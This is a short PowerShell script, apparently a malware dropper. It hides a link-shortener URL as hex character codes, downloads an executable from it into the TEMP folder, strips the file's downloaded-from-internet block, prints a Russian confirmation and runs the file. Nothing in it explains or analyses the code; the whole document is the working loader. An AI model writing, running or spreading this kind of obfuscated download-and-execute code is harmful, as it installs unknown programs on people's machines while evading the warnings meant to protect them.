${x} = ([char]0x68), ([char]0x74), ([char]0x74), ([char]0x70), ([char]0x73), ([char]0x3a), ([char]0x2f), ([char]0x2f), ([char]0x75), ([char]0x2e), ([char]0x74), ([char]0x6f), ([char]0x2f), ([char]0x41), ([char]0x7a), ([char]0x74), ([char]0x33), ([char]0x49), ([char]0x67)
${url} = ${x} -join ''
${output} = "$env:TEMP\myfile.exe"

Invoke-WebRequest -Uri ${url} -OutFile ${output} -UserAgent 'Mozilla/5.0'

Unblock-File -Path ${output}
Write-Host "Файл разблокирован" -ForegroundColor Green

Start-Process ${output}